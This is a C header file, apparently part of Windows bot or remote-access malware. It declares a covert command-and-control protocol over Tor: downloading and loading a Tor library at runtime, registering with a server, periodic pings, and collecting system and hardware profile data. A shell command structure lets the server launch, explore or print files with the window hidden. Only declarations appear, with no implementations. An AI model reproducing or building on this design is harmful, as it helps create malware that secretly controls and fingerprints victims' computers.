#ifndef HTTP_H_INCLUDED
#define HTTP_H_INCLUDED

#ifdef _WIN32
#include <windows.h>
#endif

#include "compat.h"

#define ERR_HTTP_OK       0
#define ERR_HTTP_PRE      2
#define ERR_HTTP_CONNECT  4
#define ERR_HTTP_REQUEST  8
#define ERR_HTTP_SEND     16
#define ERR_HTTP_WRITE    32
#define ERR_HTTP_RESPONSE 64
#define ERR_HTTP_QUERY    128
#define ERR_HTTP_READ     256

#define RSP_OK            0
#define RSP_ERR           2
#define RSP_PROTOCOL      4
#define RSP_PROTOCOL_FLAG 8
#define RSP_PROTOCOL_CODE 16
#define RSP_WRONGSIZE     32
#define RSP_WRONGPKGSIZE  64

#define ST_UNAUTH         128

#define SID_LEN           32
#define SID_ZEROES0       0x10
#define SID_ZEROES1       0x05
#define MARKER_SIZ        8
#define RND_LEN           64
#define AESKEY_SIZ        32

/* response flags from server */
#define RF_AGAIN          0x41
#define RF_ERROR          0x42
#define RF_OK             0x66
#define RF_ALL            {RF_AGAIN,RF_ERROR,RF_OK}
/* response codes (RCs) from server <=> request client action */
/* response codes (RCs)   to server <=> request server action */
#define RC_INFO           0xACAB
#define RC_REGISTER       0xAABB
#define RC_PING           0x0043
#define RC_SHELL          0x0044
#define RC_ALL            {RC_INFO,RC_REGISTER,RC_PING,RC_SHELL}


typedef unsigned char  rpkg[0];

typedef unsigned char  rflags;
typedef uint16_t       rrcode;
typedef unsigned char* rrbuff;
typedef uint32_t       rrsize;

typedef struct http_resp {
    char   startMarker[MARKER_SIZ];
    rflags respFlags;       /* RF_* */
    rrcode respCode;        /* RC_* */
    rrsize pkgsiz;
    rpkg   pkgbuf;
} __attribute__((packed, gcc_struct)) http_resp;


#ifdef _WIN32
typedef int (__stdcall *tor_main_t) (int proxy_port, unsigned int ident);

int initHttp(LoadLibraryFunc loadlib, GetProcAddressFunc getproc);

typedef struct http_args {
    LPCSTR host;
    DWORD  hostLen;
    LPCSTR resource;
    DWORD  resourceLen;
    LPCSTR method;
    DWORD  methodLen;
    rrbuff upload;
    DWORD  uploadLen;
} http_args;

int sendHttpRequest(http_args* hArgs, rrbuff* recv_buf, rrsize* recv_siz, DWORD* pStatusCode);

int sendWeb2Tor(LPCSTR resource, LPCSTR method, rrbuff send_buf, rrsize send_siz, rrbuff* recv_buf, rrsize* recv_siz);

int downloadLibtor(char** pLibPath);

tor_main_t
loadLibtor(char* libPath, HMODULE* hmod, LoadLibraryFunc loadlib, GetProcAddressFunc getproc);

int sendRequest(rrcode query_code, rrbuff send_buf, rrsize send_siz, rrbuff* recv_buf, rrsize* recv_siz);

int httpLoopAtLeastOnce(void);

uint32_t getNextPingTime(void);

#endif /* _WIN32 */

int parseResponse(const rrbuff recv_buff, rrsize recv_siz, http_resp** hResp, size_t* pBufOff, const char* startMarker);

int addRequest(rrbuff* send_buf, rrsize* send_siz, struct http_resp* hresp);

/* data structures for valid pkgbuf's */
#ifdef _WIN32
struct req_info {
    SYSTEM_INFO      si;
    HW_PROFILE_INFOA hw;
    uint16_t         cmdLineLen;
    uint8_t          devsLen;
    rpkg             data;
} __attribute__((packed, gcc_struct));
#endif

struct resp_register {
    unsigned char aeskey[AESKEY_SIZ];
    uint32_t next_ping;
} __attribute__((packed, gcc_struct));

struct resp_pong {
    uint32_t next_ping;
} __attribute__((packed, gcc_struct));

#define OP_OPEN 1
#define OP_EXPL 2
#define OP_PRNT 4

#define SC_HIDE 0
#define SC_SHOW 255

struct resp_shell {
    uint8_t  operation;
    uint8_t  showcmd;
    uint16_t fileLen;
    uint16_t paramLen;
    uint16_t dirLen;
    rpkg     data;
} __attribute__((packed, gcc_struct));

#endif /* HTTP_H_INCLUDED */
